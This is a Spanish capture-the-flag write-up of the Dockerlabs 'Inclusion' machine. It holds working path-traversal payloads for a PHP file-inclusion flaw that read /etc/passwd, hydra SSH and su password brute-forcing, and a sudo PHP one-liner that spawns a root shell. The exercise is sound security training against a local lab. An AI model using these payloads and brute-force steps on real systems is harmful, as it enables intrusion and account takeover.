
# Writeup Template: Maquina `[ Inclusion ]`

- Tags: #Inclusion
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Include](https://mega.nz/file/AalG1ZoR#Fm9_h5l_LUDw4bSy2NniytGsLuSD4EA12gUJ5ofYTF4)

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x inclusion.zip
sudo bash auto_deploy.sh inclusion.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((DebianMantic))
```
---

## Enumeracion de [Servicio Web Principal]
Direccion URL principal
```bash
http://172.17.0.2/shop/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/shop/: Potentially interesting folder
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/shop/                (Status: 200) [Size: 1112]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt
```

- **Hallazgos**:
```bash
/shop  (Status: 301) [Size: 307] [--> http://172.17.0.2/shop/]
```

Revisando la web tenemos este error visible:
```bash
"Error de Sistema: ($_GET['archivo']");
```

Ahora revisamos si existe algun archivo que este realizando una llamaba bajo el parametro que nos muestra en el error
```bash
gobuster dir -u http://172.17.0.2/shop/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt
```

Tenemos un archivo **php**
```bash
/index.php            (Status: 200) [Size: 1112]
```

Ejecutamos el siguiente comando para ver si podemos **fuzzear** rutas en el sistema en caso de que el parametro sea vulnerable:
```bash
wfuzz -c --hw 87,90,92,93 -t 200 -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.17.0.2/shop/index.php?archivo=FUZZ"
```

Tenemos todas estas formas de porder leer archivos:
```bash
 "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"         
 "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"                                      
 "../../../../../../../../../../../../../../../../../../../../../etc/passwd"   
 "../../../../../../../../../../../../../../../../etc/passwd"                  
 "../../../../../../../../../../../../../../../../../../../etc/passwd"         
 "../../../../../../../../../../../../../../../../../etc/passwd"               
 "../../../../../../../../../../../../../../../../../../etc/passwd"            
 "../../../../../../../../../../../../../../../etc/passwd"                     
 "../../../../../../../../../../../../../../etc/passwd"                        
 "../../../../../../../../../../../../../etc/passwd"                           
 "../../../../../../../../../../../../../../../../../../../../etc/passwd"      
 "../../../../../../../../../../../../../../../../../../../../../../etc/passwd"
 "../../../../../../etc/passwd"                                                
 "../../../../../../../../../../etc/passwd"                                    
 "../../../../../../../../../../../../etc/passwd"                              
 "../../../../../../etc/passwd&=%3C%3C%3C%3C"                                  
 "../../../../../../../../../../../etc/passwd"                                 
 "../../../../../../../../etc/passwd"                                          
 "../../../../../../../../../etc/passwd"                                       
 "../../../../../../../etc/passwd"                                             
 "../../../../../etc/passwd"                                                   
 "../../../../etc/passwd"                                                      
 "../../../../../../../../../../../../etc/hosts"                               
```
### Credenciales Encontradas
Logramos ver a dos usuarios del sistema:
```bash
seller:x:1000:1000:seller,,,:/home/seller:/bin/bash
manchi:x:1001:1001:manchi,,,:/home/manchi:/bin/bash
```
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Intentando **PHPFileter** no obutivimos nada positivo asi que lo descartamos:
```bash
php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'
```

### Ejecucion del Ataque
Ahora que sabemos los nombres de los dos usuarios, Realizaremos un ataque de fuerza bruta con **hydra**
Guardamos los nombres de los usuarios en un archivo: **( users.txt )**
```bash
# Comandos para explotación
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -t 64 ssh://172.17.0.2
```

Tenemos las credenciales del usuario:
```bash
[22][ssh] host: 172.17.0.2   login: manchi   password: lovely
```

### Intrusion
Ahora nos conectamos por **ssh** con estas credenciales:
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh manchi@172.17.0.2
```

---
## Escalada de Privilegios
### Enumeracion del Sistema
Realizada una enumeracion con encontramos, permisos especiales, SUID, Capabiliteies, Procesos del sistema, archivos ocultos, Etc
Asi que realizaraemos fuerza bruta a los usuarios del sistema:

Ya con las dos herramientas disponilbes **( Linux-Su-Force.sh ) ( rockyou.txt )**:
```bash
scp Linux-Su-Force.sh manchi@172.17.0.2:/home/manchi/Linux-Su-Force.sh
scp rockyou.txt manchi@172.17.0.2:/home/manchi/rockyou.txt
```

Una ves transferidas las herramientas ejecutamos el ataque de fuerza bruta:
```bash
./Linux-Su-Force.sh seller rockyou.txt
```

```bash
Contraseña encontrada para el usuario seller: qwerty
```

Nos logueamos como ese usuario:
### Explotacion de Privilegios

###### Usuario `[ seller ]`:
Listando los permisos para este usuario:
```bash
sudo -l

User seller may run the following commands on f2c77ffc68a5:
    (ALL) NOPASSWD: /usr/bin/php # tenemos una via potencial de migrar a root
```

Explotamos el privilegio
```bash
# Comando para escalar al usuario: ( root )
sudo -u root /usr/bin/php -r "system('/bin/bash');"
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@f2c77ffc68a5:/home/seller# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a detectar un **LFI**
2. Aprendimos a ver usuarios del sistema mediante un **LFI**
3. Aprendimos a realizar ataque de fuerza bruta por **ssh**
4. Explotamos el binario de **php** para obtener privilegios de **root**

## Recomendaciones de Seguridad
- Sanitizar los parametros de la consulta **php**
- Contrasenas mas robustas para los usuarios del sistema.